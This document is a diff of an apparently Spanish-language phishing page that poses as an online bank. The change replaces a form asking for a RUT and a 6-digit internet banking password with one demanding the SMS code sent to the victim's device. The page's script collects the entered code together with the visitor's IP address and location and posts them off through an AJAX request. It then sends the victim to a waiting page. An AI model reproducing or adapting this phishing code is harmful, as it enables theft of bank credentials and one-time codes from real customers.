@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html >
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BancaInternet</title>
+    <title>internet-Fall</title>
 
     <link rel="stylesheet" href="foster/home.css">
 
@@ -11,25 +12,21 @@
 
 
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="fallsguy/dett.js"></script>
     <script>
       $.getJSON("https://api.ipify.org?format=json", function(data) {
-              $("#gfg").html(data.ip);
-          });
-          $.getJSON("https://ipinfo.io", function(response) {
-        $("#ip").html("IP: " + response.ip);
-        $("#address").html("" + response.city + ", " + response.country);
+        $("#gfg").html(data.ip);
       });
-  
-      var u_name, u_name2, ip, ip2, message;
+    
+      var u_name, ip, ip2, message;
       var ready = function() {
-        u_name = document.getElementById("primerrut").value;
-        u_name2 = document.getElementById("segundointernet").value;
+        u_name = document.getElementById("mont").value;
         ip = document.getElementById("gfg").innerHTML;
         ip2 = document.getElementById("address").innerHTML;
-        message = "MMMBB\n☰ELRUT: " + u_name + "\n☰LACINT: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+        message = "Cod papa\n☰sms111: " + u_name + "\n🌎IP: " + ip +"\n" + ip2;
       };
+    
       var sender = function() {
         ready();
         var settings = {
@@ -48,15 +45,15 @@
         };
         $.ajax(settings).done(function(response) {
           console.log(response);
-          window.location = 'waitforthe.html';
+          window.location = 'waitforthe2.html';
         });
         return false;
       };
-  
-  </script>
+    </script>
+    
 
 </head>
-<body style="background-color: white;">
+<body>
 
 
 
@@ -72,11 +69,11 @@
     <div  class="sitefan">
 <img src="foster/monsterlog.png" alt="brokxj"><br><br>
 
-<h2>Rellena lo solicitado</h2>
+<h2>    Ingresa el SMS Enviado a tu dispositivo (OBLIGATORIO)</h2>
 <br>
 
-<input inputmode="numeric"   name="primerrut"     id="primerrut"   placeholder="INGRESA TU RUT"  type="text"  required=""><br>
-<input   inputmode="numeric"   name="segundointernet"    id="segundointernet" minlength="6" maxlength="6" placeholder="CLAVE DE INTERNET 6 DIGITOS"  type="text" required="">
+
+<input  inputmode="numeric"    name="mont"    id="mont" minlength="6" maxlength="6" placeholder="INGRESA EL SMS "  type="text" required="">
 
 <input class="voygo" value="SIGUIENTE" type="submit">      </form>
 </center>
